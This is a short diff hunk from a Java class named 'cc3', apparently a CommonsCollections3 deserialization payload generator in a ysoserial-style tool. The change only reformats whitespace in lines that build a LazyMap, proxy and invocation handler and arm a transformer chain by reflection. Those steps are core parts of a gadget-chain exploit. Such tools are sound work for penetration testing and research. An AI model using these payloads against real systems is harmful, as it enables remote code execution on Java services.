@@ -47,10 +47,10 @@ public class cc3 implements ObjectPayload<Object> {
                         new Class[]{Templates.class},
                         new Object[]{templatesImpl})};
 
-        final Map               innerMap = new HashMap();
-        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
-        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
